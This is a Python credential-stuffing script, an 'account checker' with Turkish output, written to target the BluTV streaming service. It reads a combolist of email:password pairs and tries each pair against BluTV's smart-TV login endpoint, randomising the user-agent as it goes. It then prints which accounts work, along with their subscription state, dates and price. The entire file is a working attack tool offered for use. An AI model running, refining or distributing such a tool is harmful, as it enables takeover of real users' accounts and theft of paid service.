from colorama import Fore
import requests
import time
import os,sys,ctypes
import linecache
import random

banner = """
██████╗░██╗░░░░░██╗░░░██╗████████╗██╗░░░██╗  ░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗███████╗██████╗░
██╔══██╗██║░░░░░██║░░░██║╚══██╔══╝██║░░░██║  ██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝██╔════╝██╔══██╗
██████╦╝██║░░░░░██║░░░██║░░░██║░░░╚██╗░██╔╝  ██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░█████╗░░██████╔╝
██╔══██╗██║░░░░░██║░░░██║░░░██║░░░░╚████╔╝░  ██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
██████╦╝███████╗╚██████╔╝░░░██║░░░░░╚██╔╝░░  ╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║
╚═════╝░╚══════╝░╚═════╝░░░░╚═╝░░░░░░╚═╝░░░  ░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
"""
os.system('cls')
def slowprints(s):
   for c in s + '\n':
       sys.stdout.write(c)
       sys.stdout.flush()
       time.sleep(1./99)

def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""
slowprints(Fore.BLUE+banner)

toplamhesap = 0
islem = 0
valid = 0
custom = 0 
invalid = 0
comboyer = input("Lütfen Combolistin Ismini Giriniz (combo.txt) : ")
try:
    f = open(comboyer)
    for x in f:
        toplamhesap = toplamhesap + 1
except IOError:
    print(f"{Fore.RED}Combolist Bulunamadı!")
    exit()
slowprints(f"{Fore.BLUE}Combolistte bulunan tahmini hesap sayısı : {Fore.WHITE}{toplamhesap}")
os.system('cls')
print(Fore.BLUE+banner+Fore.RESET)
while islem<toplamhesap:
    islem = islem + 1
    hesapp = linecache.getline(comboyer, islem)
    hesap = hesapp[:-1].split(":")
    ctypes.windll.kernel32.SetConsoleTitleW(f"BluTV Account Checker by Yoseff  |  Checked: {islem}/{toplamhesap}  |  Active: {valid}   |  Custom: {custom}  |  Invalid: {invalid}")
    try:
        if hesap[1]:
            mail = hesap[0]
            password = hesap[1]
            url = 'https://smarttv.blutv.com.tr/actions/account/login'
            data = {'username' : f'{mail}', 'password' : f'{password}', 'platform' : 'com.blu.smarttv'}
            headers = {'user-agent': f'Mozilla/5.0 (Linux; Tizen 2.3) AppleWebKit/{random.randint(100,999)}.1 (KHTML, like Gecko)Version/2.3 TV Safari/{random.randint(100,999)}.1'}
            blu = requests.post(url, data=data, headers=headers)
            status = find_between( blu.text, '{"status":"', '",')
            if(status == "ok"):
                valid = valid + 1
                accountstate = find_between( blu.text, 'AccountState":"', '",')
                startdate = find_between( blu.text, 'StartDate":"', '",')
                enddate = find_between( blu.text, 'EndDate":"', '",')
                price = find_between( blu.text, 'Price":"', '",')
                if(accountstate == 'Active'):
                    accountstate = 'AKTİF'
                    slowprints(f"{Fore.CYAN}> Hesap --{Fore.RESET}> {mail}:{password} |  Başlangıç Tarihi: {startdate} - Bitiş Tarihi: {enddate} - Ücret: {price} - Hesap Durum: {Fore.GREEN}{accountstate} | {Fore.GREEN} Aktif{Fore.RESET}")
                if(accountstate == 'Suspend'):
                    accountstate = 'DURDURULMUŞ'
                    slowprints(f"{Fore.CYAN}> Hesap --{Fore.RESET}> {mail}:{password} | Başlangıç Tarihi: {startdate} - Bitiş Tarihi: {enddate} - Ücret: {price} - Hesap Durum: {Fore.RED}{accountstate} | {Fore.GREEN} Aktif{Fore.RESET}")
                if(accountstate == 'Canceled'):
                    accountstate = 'KAPANMIŞ'
                    slowprints(f"{Fore.CYAN}> Hesap --{Fore.RESET}> {mail}:{password} |  Başlangıç Tarihi: {startdate} - Bitiş Tarihi: {enddate} - Ücret: {price} - Hesap Durum: {Fore.RED}{accountstate} | {Fore.GREEN} Aktif{Fore.RESET}")
                if(accountstate == 'None'):
                    accountstate = 'CUSTOM'
                    slowprints(f"{Fore.CYAN}> Hesap --{Fore.RESET}> {mail}:{password} |  Hesap Durum: {Fore.YELLOW}{accountstate} | {Fore.GREEN} Aktif{Fore.RESET}")
                    custom = custom + 1
            else:
                slowprints(f"{Fore.CYAN}> Hesap --{Fore.RESET}> {mail}:{password} | {Fore.RED} Geçersiz Hesap{Fore.RESET}")
                invalid = invalid + 1
    except IndexError:
        slowprints(f"{Fore.CYAN}> Hesap --{Fore.RESET}> {mail} | {Fore.RED} Geçersiz Hesap Türü{Fore.RESET}")
        invalid = invalid + 1
print(f"""
{Fore.BLUE}Coded By BlackStone
{Fore.BLUE}Sonuç;
{Fore.BLUE}Kontrol Edilen Toplam Hesap :{Fore.WHITE}{toplamhesap}
{Fore.BLUE}Kontrol Edilen Toplam Geçersiz Hesap :{Fore.WHITE}{invalid}
{Fore.BLUE}Kontrol Edilen Toplam Aktif Hesap :{Fore.WHITE}{valid}
""")